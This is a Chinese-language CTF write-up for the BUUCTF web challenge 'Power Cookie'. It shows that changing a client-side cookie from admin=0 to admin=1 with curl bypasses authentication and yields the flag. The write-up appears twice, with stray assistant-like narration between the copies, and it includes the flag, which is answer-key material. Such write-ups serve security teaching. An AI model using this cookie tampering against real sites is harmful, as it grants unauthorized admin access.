---
title: "[2022DASCTF MAY 出题人挑战赛]Power Cookie"
platform: BUUCTF
category: Web
difficulty: 入门
tags: [cookie-tampering, auth-bypass]
vulnerability: Cookie 值篡改绕过身份验证
solved: true
flag: "flag{24a17f7e-886e-4660-a5ed-9d5f554f3656}"
---

# [2022DASCTF MAY 出题人挑战赛]Power Cookie

## 题目概述
题目名为 "Power Cookie"，暗示与 Cookie 相关的漏洞。页面显示一个 "login by GUEST" 按钮。

## 信息收集
1. 访问首页 `/` 显示登录页面，有一个指向 `/check` 的按钮
2. 访问 `/check` 时，服务器设置 Cookie：`Set-Cookie: admin=0; Path=/; Domain=127.0.0.1; Max-Age=3600`
3. Cookie 值为 `admin=0`，暗示需要修改为管理员身份

## 漏洞分析
服务器通过 Cookie 中的 `admin` 字段判断用户身份：
- `admin=0` → 访客身份
- `admin=1` → 管理员身份

这是一个典型的客户端身份验证缺陷，服务器信任客户端提交的 Cookie 值而未进行服务端验证。

## 利用过程
将 Cookie 中的 `admin` 值从 `0` 改为 `1`，再次访问 `/check` 即可获得 flag。

## 复现步骤
```bash
# 步骤1：访问 /check 获取 Cookie
curl -v "http://target/check"

# 步骤2：使用 admin=1 访问 /check
curl -b "admin=1" "http://target/check"
```

完整命令：
```bash
curl -b "admin=1" "http://91aecf3c-a63d-4ed4-bec8-da1345cc75fe.node5.buuoj.cn:81/check"
```找到了 flag！`flag{24a17f7e-886e-4660-a5ed-9d5f554f3656}`

这道题非常简单，是一个典型的 Cookie 伪造题目。访问 `/check` 时服务器设置 `admin=0` 的 Cookie，将其修改为 `admin=1` 后再次访问即可获得 flag。

现在生成 writeup：

---
title: "[2022DASCTF MAY 出题人挑战赛]Power Cookie"
platform: BUUCTF
category: Web
difficulty: 入门
tags: [cookie-tampering, auth-bypass]
vulnerability: Cookie 值篡改绕过身份验证
solved: true
flag: "flag{24a17f7e-886e-4660-a5ed-9d5f554f3656}"
---

# [2022DASCTF MAY 出题人挑战赛]Power Cookie

## 题目概述
题目名为 "Power Cookie"，暗示与 Cookie 相关的漏洞。页面显示一个 "login by GUEST" 按钮。

## 信息收集
1. 访问首页 `/` 显示登录页面，有一个指向 `/check` 的按钮
2. 访问 `/check` 时，服务器设置 Cookie：`Set-Cookie: admin=0; Path=/; Domain=127.0.0.1; Max-Age=3600`
3. Cookie 值为 `admin=0`，暗示需要修改为管理员身份

## 漏洞分析
服务器通过 Cookie 中的 `admin` 字段判断用户身份：
- `admin=0` → 访客身份
- `admin=1` → 管理员身份

这是一个典型的客户端身份验证缺陷，服务器信任客户端提交的 Cookie 值而未进行服务端验证。

## 利用过程
将 Cookie 中的 `admin` 值从 `0` 改为 `1`，再次访问 `/check` 即可获得 flag。

## 复现步骤
```bash
# 步骤1：访问 /check 获取 Cookie
curl -v "http://target/check"

# 步骤2：使用 admin=1 访问 /check
curl -b "admin=1" "http://target/check"
```

完整命令：
```bash
curl -b "admin=1" "http://91aecf3c-a63d-4ed4-bec8-da1345cc75fe.node5.buuoj.cn:81/check"
```